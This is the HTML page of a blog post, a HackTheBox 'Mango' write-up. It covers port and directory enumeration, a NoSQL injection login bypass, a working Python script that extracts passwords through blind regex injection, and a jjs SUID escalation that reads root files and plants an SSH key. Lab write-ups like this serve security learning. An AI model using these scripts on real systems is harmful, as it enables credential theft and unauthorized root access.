@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/succurity.com\/",
+  "author": {
+    "@type": "Person",
+    "name": "Sage",
+    
+    "image": "https://succurity.com/images/me.jpg"
+    
+  },
+  "name":"Sage\x27s Succurity Blog",
+  "description":"\x3cp\x3eMango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.\x3c\/p\x3e",
+  "url":"https:\/\/succurity.com\/post\/write-ups\/htb-mango\/",
+  "keywords":"[pentesting, Labs, HackTheBox, Mango]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Sage">
+<meta name="keywords" content="pentesting, Labs, HackTheBox, Mango">
+<meta name="description" content="Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.">
+
+
+<meta property="og:description" content="Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox | Mango Writeup">
+<meta name="twitter:title" content="HackTheBox | Mango Writeup">
+<meta property="og:url" content="https://succurity.com/post/write-ups/htb-mango/">
+<meta property="twitter:url" content="https://succurity.com/post/write-ups/htb-mango/">
+<meta property="og:site_name" content="Sage&#39;s Succurity Blog">
+<meta property="og:description" content="Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.">
+<meta name="twitter:description" content="Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2021-02-28T13:11:24">
+  
+  
+    <meta property="article:modified_time" content="2021-02-28T13:11:24">
+  
+  
+  
+    
+      <meta property="article:section" content="HackTheBox">
+    
+      <meta property="article:section" content="write-ups">
+    
+  
+  
+    
+      <meta property="article:tag" content="security">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/me.jpg">
+  <meta property="twitter:image" content="https://succurity.com/images/me.jpg">
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/HackTheBox/Mango/banner.JPG">
+  <meta property="twitter:image" content="https://succurity.com/images/HackTheBox/Mango/banner.JPG">
+
+
+
+    <title>HackTheBox | Mango Writeup</title>
+
+    <link rel="icon" href="https://succurity.com/images/favicon.ico">
+    
+
+    
+
+    <link rel="canonical" href="https://succurity.com/post/write-ups/htb-mango/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://succurity.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://succurity.com/" aria-label="Go to homepage">Sage&#39;s Succurity Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://twitter.com/misusage_" target="_blank" rel="noopener" aria-label="Open the link: https://twitter.com/misusage_">
+    
+    
+    
+      
+        <img class="header-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://succurity.com/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Sage</h4>
+        
+          <h5 class="sidebar-profile-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories/write-ups" title="CTF Writeups">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">CTF Writeups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/page/about" title="About Me">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener" title="LinkedIn">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-linkedin" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/misusage_" target="_blank" rel="noopener" title="Twitter">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-twitter" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-left
+              "
+       style="background-image:url('/images/HackTheBox/Mango/banner.JPG')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      HackTheBox | Mango Writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2021-02-28T13:11:24-08:00">
+        
+  February 28, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://succurity.com/categories/hackthebox">HackTheBox</a>, 
+    
+      <a class="category-link" href="https://succurity.com/categories/write-ups">write-ups</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <p>Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do.</p>
+<!-- raw HTML omitted -->
+<table>
+<thead>
+<tr>
+<th align="center">Event</th>
+<th align="center">Challenge</th>
+<th align="center">OS</th>
+<th align="center">Difficulty</th>
+<th align="center">IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">HackTheBox</td>
+<td align="center">Mango</td>
+<td align="center">Linux</td>
+<td align="center">Medium</td>
+<td align="center">10.10.10.162</td>
+</tr>
+</tbody>
+</table>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="tools-used">Tools Used</h2>
+<!-- raw HTML omitted -->
+<ul>
+<li>Burp Suite Community v2020.1</li>
+<li>Gobuster</li>
+<li>Nmap</li>
+<li>Seclists</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">NoSQL Injections</a></li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="start">Start</h2>
+<!-- raw HTML omitted -->
+<p>Starting off, I did a quick nmap scan. Looking at the results, only 3 ports were open. I always launch a quick scan to give me ports to enumerate, since the full scan could take a long time to complete.
+<code>nmap -oN quick-mango-10.10.10.162 10.10.10.162</code></p>
+<pre><code>Nmap scan report for 10.10.10.162
+Host is up (0.092s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre><p>As soon as that&rsquo;s done, let&rsquo;s launch a full scan and at the same time, start enumerating the ports: <code>nmap -p- -T4 -A -oN mango-full-10.10.10.162 10.10.10.162</code></p>
+<p>First off, let&rsquo;s spin up Burp. It&rsquo;s a good idea to do all the web requests through burp as it can show you more info that coule be possibly useful later. Quickly looking at the website, port 80 gives us nothing. Well, something is blocking us from viewing the site on port 80. We will come back to this later.
+<img src="https://succurity.com/images/HackTheBox/Mango/403.JPG" alt="403-Forbidden"></p>
+<p>Now let&rsquo;s try 443:
+<img src="https://succurity.com/images/HackTheBox/Mango/4.JPG" alt="Webpage"></p>
+<p>And we got a cool google-esc looking website. The only thing available is the Analytics page near the top right.
+<img src="https://succurity.com/images/HackTheBox/Mango/5.JPG" alt="Webpage"></p>
+<p>A quick detour to look back at our completed full scan shows us that there are no other open ports on the box. This means that the way in must be through one of the 3 ports we found.</p>
+<pre><code>Nmap scan report for 10.10.10.162
+Host is up (0.088s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|_  256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=44222%PV=Y%DS=2%DC=T%G=Y%TM=5E55FD4
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT      ADDRESS
+1   90.82 ms 10.10.14.1
+2   84.29 ms 10.10.10.162
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</code></pre><p>Alright, back to the website enumeration. The analytics page is interesting since it looks like a fancy graph.js plot. Clicking on everything shows us a <em>possible</em> way in. Let&rsquo;s see if we can do an RFI with the Open Report function:</p>
+<p><img src="https://succurity.com/images/HackTheBox/Mango/6.JPG" alt="Open Report"></p>
+<p>AND&hellip;.. We can&rsquo;t. Dang. Definitely not the way in. <img src="https://succurity.com/images/HackTheBox/Mango/7.JPG" alt="No RFI"></p>
+<p>Let&rsquo;s keep going. I was actually stuck at this step for a while (<em>About 4-ish hours</em>) and eventually, I gave in and looked for a hint in the HTB forums. Someone mentioned something about hostnames so I keep enumerating. Finnaly looking at the cert information, we can see the box name is <code>staging-order.mango.htb</code>. <img src="https://succurity.com/images/HackTheBox/Mango/8.JPG" alt="Cert Info"></p>
+<p>After setting this in our hosts file, we can now see the main page after navigating to it with the hostname.
+<img src="https://succurity.com/images/HackTheBox/Mango/1.JPG" alt="Hosts File">
+<img src="https://succurity.com/images/HackTheBox/Mango/10.JPG" alt="Port 80 - Now Visible"></p>
+<p>Awesome! We have a login prompt. Ok. After all this trouble, this definitely has to be the way in. Trying default creds like <code>admin:admin</code> or <code>mango:mango</code> doesn&rsquo;t seem to do anything. Looking at the request through burp, everything seems normal and nothing sticks out to me. The good thing is now that we have another page to sift through, we can continue our enumeration. Let&rsquo;s throw Gobuster at this page.</p>
+<!-- raw HTML omitted -->
+<h2 id="gobuster">Gobuster</h2>
+<!-- raw HTML omitted -->
+<p><img src="https://succurity.com/images/HackTheBox/Mango/11.JPG" alt="Gobuster Results"></p>
+<p>The wordlists I used are from <a href="https://github.com/danielmiessler/SecLists">Dan Miessler&rsquo;s Seclists</a>. After trying different wordlists, I found the <code>/vender/composer/</code> directory.</p>
+<p><strong>Useful tips:</strong> A cool flag to use while directory bruteforcing is <code>-x</code> This tells gobuster to look for files with the extension of your choosing while it does it&rsquo;s thing and scans the site. <code>gobuster -u http://staging-order.mango.htb/vendor/composer -w /opt/SecLists/Discovery/Web-Content/big.txt -x json | tee vendor-folder-2</code>. Another useful tip is to pipe your commands through <code>tee</code> which saves all the output directly to a file.</p>
+<p>Looking at the <code>installed.json</code> file, something useful is revealed to us about the backend database to this site.:
+<img src="https://succurity.com/images/HackTheBox/Mango/12.JPG" alt="Installed.json file"></p>
+<!-- raw HTML omitted -->
+<h2 id="mongodb">MongoDB</h2>
+<!-- raw HTML omitted -->
+<p>Mongo DB!!! Ahhh. Our backend is running a NoSQL database. After researching NoSQL injections, I found this super useful <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">github repo</a>. It&rsquo;s literally the first entry that comes up when you google it.</p>
+<p>The section about Authentication Bypass seemed super interesting. Let&rsquo;s try it in Mango.
+<img src="https://succurity.com/images/HackTheBox/Mango/14.JPG" alt="NoSQL Injection"></p>
+<p>It seems we have 2 fields to manipulate. In order to be precise, let&rsquo;s just target the username field by itself then the password field after. We need to see which parameter is vulnerable, <em>if</em> they are actually vulnerable to NoSQL injections. In Burp, I&rsquo;ll intercept the request, and edit the username field by adding the <code>[$ne]</code> before sending it off.
+<img src="https://succurity.com/images/HackTheBox/Mango/15.JPG" alt="Burp request 1"></p>
+<p>Doing that gives us no result. Let&rsquo;s try it again, but this time, we can modify the password field.</p>
+<p><img src="https://succurity.com/images/HackTheBox/Mango/16.JPG" alt="Burp request 2"></p>
+<p>Oh man!!! We have a 302 redirect to <code>home.php</code>. Looks like it did something.
+<img src="https://succurity.com/images/HackTheBox/Mango/16-1.JPG" alt="Burp request 3"></p>
+<p>We are finally greeted with a under construction webpage.
+<img src="https://succurity.com/images/HackTheBox/Mango/17.JPG" alt="Burp request 4"></p>
+<p>At this point, I am not 100% sure if the webpage is breaking because of our NoSQL Injection or there is actually no home page but we know two things now. One, our webpage is affected by a NoSQL injection. And two, we have to use this vulnerability to break our way in. Let&rsquo;s start by enumerating users. If you look at the under construction prompt, it seems we have one <code>admin</code>!</p>
+<!-- raw HTML omitted -->
+<h2 id="enumerating-users">Enumerating Users</h2>
+<!-- raw HTML omitted -->
+<p>In Burp, I sent the request over to the repeater. I know that if I get a <code>302 Redirect</code> then the username could possibly exist. Let&rsquo;s try the same request as before only this time, we can change the username to <code>bob</code>.
+<img src="https://succurity.com/images/HackTheBox/Mango/18.JPG" alt="Enumerating users"></p>
+<p>And&hellip; that did nothing. Switching the username back to <code>mango</code> gives us the redirect once again. Trying it again with <code>admin</code> also gives a redirect. This confirms that we have 2 valid usernames as well as a way to enumerate users.</p>
+<p>Valid users: <code>admin</code> &amp; <code>mango</code></p>
+<!-- raw HTML omitted -->
+<h2 id="nosql-injection">NoSQL Injection</h2>
+<!-- raw HTML omitted -->
+<p>Using the info from the <em>Extract data information</em> section, we can actually use the <code>$regex</code> syntax to do a blindly guess the password. The two fields that do give us a 302 redirect are: <code>username[$ne]=toto&amp;password[$regex]=m.{2}</code> and <code>username[$ne]=toto&amp;password[$regex]=m.*</code>. With this bit of information, we know we can slowly enumerate the password.</p>
+<p><img src="https://succurity.com/images/HackTheBox/Mango/19.JPG" alt="NoSQL regex"></p>
+<p><strong>Note: I did these next steps in Burp Intruder before getting stuck. I spent another good 3-4 hours breaking my head, trying to enumerate the users&rsquo; passwords. Eventually I switched over to the route that everyone recommended in the forums, which was to create a script.</strong></p>
+<p>The next logical step is to guess the password. Remember that we don&rsquo;t have any debugging information coming back to us, except a redirect. Therefore, this next attack will be done blindly, hence the name, <strong>Blind NoSQL Injection</strong>. We can start by using the script found under <em>POST with JSON body</em> on the same NoSQL Injection page.</p>
+<pre><code>import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username=&quot;admin&quot;
+password=&quot;&quot;
+u=&quot;http://example.org/login&quot;
+headers={'content-type': 'application/json'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{&quot;username&quot;: {&quot;$eq&quot;: &quot;%s&quot;}, &quot;password&quot;: {&quot;$regex&quot;: &quot;^%s&quot; }}' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
+                print(&quot;Found one more char : %s&quot; % (password+c))
+                password += c
+</code></pre><p>Let&rsquo;s do some modifications to our script. First, let&rsquo;s add the json library, so we manipulate our payload in JSON. Speaking about JSON, since our mango app doesn&rsquo;t &lsquo;talk&rsquo; in JSON, we need to change the header content-type back to a form. <code>headers={'Content-Type': 'application/x-www-form-urlencoded'}</code>. We also need to modify our payload to be in the same format as in our site along with the regex parameter, and remove a couple of &ldquo;good&rdquo; special chars.</p>
+<p>Our ending result is this:</p>
+<pre><code>#!/usr/bin/python3
+import json
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username=&quot;admin&quot;
+password=&quot;&quot;
+u=&quot;http://staging-order.mango.htb&quot;
+headers={'Content-Type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload={&quot;username&quot;: username, &quot;password[$regex]&quot;: &quot;^&quot; + (password+c) }
+            r = requests.post(u, data = payload, headers = headers, verify=False, allow_redirects = False)
+            print(r, payload, end=&quot;\r&quot;, flush=True)
+            if 'OK' in r.text or r.status_code == 302:
+                print()
+                print(&quot;Found one more char : %s&quot; % (password+c))
+                password += c
+</code></pre><p>Running the script gives us the passwords! At this point we can keep getting $'s, so we can stop the script and remove them.</p>
+<pre><code>Found one more char : h3mXK8RhU~f{]f5
+Found one more char : h3mXK8RhU~f{]f5H
+Found one more char : h3mXK8RhU~f{]f5H$
+Found one more char : h3mXK8RhU~f{]f5H$$
+Found one more char : h3mXK8RhU~f{]f5H$$$
+Found one more char : h3mXK8RhU~f{]f5H$$$$
+</code></pre><p><img src="https://succurity.com/images/HackTheBox/Mango/20.JPG" alt="The password."></p>
+<p>We have 2 passwords now: <code>admin:t9KcS3&gt;!0B#2</code> and <code>mango:h3mXK8RhU~f{]f5H</code>.</p>
+<p>When we log onto the site with the correct password, we immediately get the <strong>under construction</strong> page. We therefore know that the previous NoSQL injection attempts would actually log us into the website, but theres really nothing to log into.</p>
+<h2 id="logging-onto-the-box">Logging onto the box.</h2>
+<p>With the creds we got, we can SSH onto the box with the mango account.
+<img src="https://succurity.com/images/HackTheBox/Mango/21.JPG" alt="SSH&rsquo;ing in."></p>
+<!-- raw HTML omitted -->
+<h2 id="user-flag">User Flag</h2>
+<!-- raw HTML omitted -->
+<p>After looking around the box, we can home in on the user flag. We can <code>su admin</code>, and log into the admin account with the other cred we found.
+<img src="https://succurity.com/images/HackTheBox/Mango/USER.JPG" alt="User flag"></p>
+<p>And there you have it. The user flag: <code>79bf31c6c6eb38a8567832f7f8b47e92</code>.</p>
+<!-- raw HTML omitted -->
+<h2 id="privesc">PrivEsc</h2>
+<!-- raw HTML omitted -->
+<p>For the privesc, I first ran <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>. Looking at the results, I found an interesting SUID binary <code>jjs</code> under <code>/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code> with the group permissions as <code>admin</code>.</p>
+<p><code>-rwsr-sr--   1 root     admin              10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code></p>
+<p><strong>JJS</strong> is a command line tool that can be used to run scripts and even run an interactive shell. Since it has the SUID, those commands can run as root. Looking at <a href="https://gtfobins.github.io/">GTFOBins</a> for <a href="https://gtfobins.github.io/gtfobins/jjs/">JJS &amp; SUID</a>, there are multiple things we can do.</p>
+<p>If we just want the root flag, we can use the <strong>File Read</strong> jjs script:</p>
+<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
+var FileReader = Java.type(&quot;java.io.FileReader&quot;);
+var br = new BufferedReader(new FileReader(&quot;file_to_read&quot;));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+</code></pre><p>Simply change the section labeled <em>&ldquo;file_to_read&rdquo;</em> to <code>&quot;/root/root.txt&quot;</code> and we get the root flag!</p>
+<!-- raw HTML omitted -->
+<h2 id="root-flag">Root Flag</h2>
+<!-- raw HTML omitted -->
+<p><img src="https://succurity.com/images/HackTheBox/Mango/rootflag.JPG" alt="Root flag">
+The root flag: <code>8a8ef79a7a2fbb01ea81688424e9ab15</code>.</p>
+<!-- raw HTML omitted -->
+<h2 id="root-shell">Root Shell</h2>
+<!-- raw HTML omitted -->
+<p>Now that we claimed our prize, we are still not done. We still need the root flag. Looking at the SSH config, the <em>PermitRootLogin</em> is set to <em>yes</em>. We can use the <strong>File Write</strong> script to add our ssh key into root&rsquo;s <em>authorized_keys</em> file and ssh in as root.</p>
+<p><img src="https://succurity.com/images/HackTheBox/Mango/permitrootSSH.JPG" alt="SSH Config"></p>
+<p>Take the original script,</p>
+<pre><code>echo 'var FileWriter = Java.type(&quot;java.io.FileWriter&quot;);
+var fw=new FileWriter(&quot;./file_to_write&quot;);
+fw.write(&quot;DATA&quot;);
+fw.close();' | jjs
+</code></pre><p>and make the following changes:</p>
+<pre><code>echo 'var FileWriter = Java.type(&quot;java.io.FileWriter&quot;);
+var fw=new FileWriter(&quot;/root/.ssh/authorized_keys&quot;);
+fw.write(&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4CdpUTcD7qgtneP8CdoYUfC5J2QTqO6yhFSWp5C6IseszAllPWi/A6gttbgliQpiT0Fze1ealQ3GEUGuNNuBKpnwdIs9i0VYDG8ScY4MIj7lAXnqC9nBuMTTR10HRfkc7DO1at9yAus64hO2XspHlZwfMa8/g3qJ2gpxzwrZLPUtdtBSp6h0psX2HGv1r71AqWcl34f1R2De+sxJWMOKfQgbT9JmNuLWU6olvtjEEGDxAbUYr37sUcobY3sDq5BStI1SocGZDEnUDp6pP601QeNoexx3OAnrVcFEHAvmYygQa2LuzkSmnXb+rwocYpbEokXv9KImDxa931KUy4YYrtBSuVQS4FAQ4lRvilTLTiKSYTw7z+FxAc2ZK6/2XEQ8DcoGLDNihwZ9n/TrFMth+zXJ1qZ82I5MYoAiNFxboiAN/NjtHRaPLH1UxABIQamQwRiqxSqk3VKXpk36STPCCYuQyi6NasSlU7Jz13ZphfQOlXF8gE70VUNThvw4TfsE= root@kali&quot;);
+fw.close();' | jjs
+</code></pre><p>With our key added, we can now ssh as root!</p>
+<p><img src="https://succurity.com/images/HackTheBox/Mango/ROOTED.JPG" alt="Fully rooted the box"></p>
+<p>And there you go! Another box has been rooted. Onto the next!</p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/security/">security</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/pentesting-field-guide/" data-tooltip="Pentesting Field Guide" aria-label="NEXT: Pentesting Field Guide">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/intro-to-buffer-overflows/" data-tooltip="Intro to Buffer Overflows" aria-label="PREVIOUS: Intro to Buffer Overflows">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/write-ups/htb-mango/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/write-ups/htb-mango/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/write-ups/htb-mango/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/write-ups/htb-mango/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/write-ups/htb-mango/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
